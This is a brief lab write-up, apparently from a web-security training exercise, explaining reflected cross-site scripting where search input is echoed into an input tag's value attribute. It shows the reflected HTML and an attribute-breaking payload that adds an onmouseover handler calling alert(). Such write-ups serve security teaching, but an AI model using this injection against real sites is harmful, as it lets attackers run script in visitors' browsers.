# Reflected XSS into attribute with angle brackets HTML encoded

### Scenario

We input a unique string like "uniquetest" and we search it in the "inspect element tab of the web browser".

```html
<h1>0 search results for 'uniquetest'</h1>
```

```html
<input type="text" placeholder="Search the blog..." name="search" value="uniquetest">
```

We notice that our string populated two element of the DOM.
One is a h1 string, **another is inside an attribute of a tag**.

### Exploit

So, we can break the tag using something like this:

```html
uniquetest" onmouseover=alert()
```

which will transform the "input tag" as following:
```html
<input type="text" placeholder="Search the blog..." name="search" value="uniquetest" onmouseover=alert()>
```

So, when we will mouse over the input element (a search bar), we will exploit the XSS vulnerability.
